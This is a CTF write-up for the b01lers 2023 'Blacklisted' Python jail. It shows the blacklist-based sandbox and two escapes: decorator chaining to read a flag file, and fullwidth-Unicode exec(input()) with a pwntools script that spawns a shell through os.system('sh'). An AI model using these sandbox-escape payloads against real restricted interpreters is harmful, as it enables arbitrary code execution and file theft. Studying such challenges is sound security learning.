# b01lers CTF 2023 Blacklisted

```python
blacklist = "._0x/|?*[]{}<>\"'=()\\\t "
blacklist2 = ['eval', 'exec', 'compile', 'import', 'os', 'sys', 'cat', 'ls', 'exit', 'list', 'max', 'min', 'set', 'tuple']

def validate(code):
    for char in blacklist:
        if char in str(code):
            return False
    for word in blacklist2:
        if word in str(code):
            return False
    return True

if __name__ == '__main__':
    print("------------------------------")
    print("Welcome to my very cool python interpreter! \nI hope I blacklisted enough... \nYou can never be too careful with these things...")
    print("Send an empty line to run!")
    print("------------------------------")
    safe_code = ""
    while (True):
        unsafe_code = input(">>> ")
        if (unsafe_code == ""):
            try:
                exec(safe_code)
            except:
                print("Error executing!")
            break
        unsafe_code = unsafe_code.replace("open", "")
        unsafe_code = unsafe_code.replace("print", "")
        if (not validate(unsafe_code)):
            print("Invalid code!")
            continue
        safe_code += str(unsafe_code)+ "\n"
```

Requirements:

1. No `.`, `_`, parentheses, brackets, quotes, spaces, tabs: use `@f` decorator syntax to call functions without parens, and form feed `\x0c` as whitespace
2. `open` and `print` stripped: write `oopenpen` and `pprintrint`, after stripping, only `open` and `print` remain
3. Blacklisted words (`exec`, `import`, `os`, `sys`, `list`, `max`, `min`, `set`, `tuple`): use `sorted` instead of `list`, `input` instead of `exec`+`input`

Challenge archive [here](https://github.com/b01lers/b01lers-ctf-2023-public).

## Solution 1: `@print @sorted @open @input` (official)

Official writeup [here](https://github.com/b01lers/b01lers-ctf-2023-public/blob/main/misc/blacklisted/solve.md).

The `@` decorator calls a function with the class as its argument, letting us bypass the parentheses ban:

```python
@pprintrint
@sorted
@oopenpen
@input
class^LX:pass
```

This is equivalent to `print(sorted(open(input(X))))`. The flow:

1. `input(X)`: displays the class repr as prompt, reads a filename from stdin
2. `open(filename)`: opens the file
3. `sorted(file_object)`: reads all lines into a sorted list (file objects are iterable)
4. `print(sorted_lines)`: prints the result

The `open`/`print` stripping is bypassed by doubling: `oopenpen` → `open`, `pprintrint` → `print`. Form feed `^L` (`\x0c`) replaces the space in `class X:pass`.

Flag is read by typing the flag path when prompted:

```
>>> @pprintrint
>>> @sorted
>>> @oopenpen
>>> @input
>>> class^LX:pass
>>>
secret_folder/flag.txt
```

## Solution 2: `@exec @input` with NFKC bypass

An alternative approach using fullwidth Unicode characters to bypass the `exec` and `x` blacklist.

```python
@\uff45\uff58\uff45\uff43    # fullwidth exec → normalizes to exec
@\uff49\uff4e\uff50\uff55\uff54  # fullwidth input → normalizes to input
class\x0cA:pass
```

Python NFKC-normalizes identifiers during compilation, so fullwidth `ｅｘｅｃ` becomes `exec`. The character blacklist checks for ASCII `x` (not fullwidth `ｘ`), and the word blacklist checks for ASCII `exec` (not `ｅｘｅｃ`).

This calls `exec(input(A))`. The `input()` reads the next line from stdin, and `exec()` executes it with full builtins access, completely unrestricted.

Attack script:

```python
from pwn import *

context.log_level = 'error'

lines = [
    "@\uff45\uff58\uff45\uff43",
    "@\uff49\uff4e\uff50\uff55\uff54",
    "class\x0cA:pass",
    "",
    "__import__('os').system('sh')",
]

p = process(["python3", "Blacklisted.py"])

for line in lines:
    p.sendline(line.encode())

p.interactive()
```
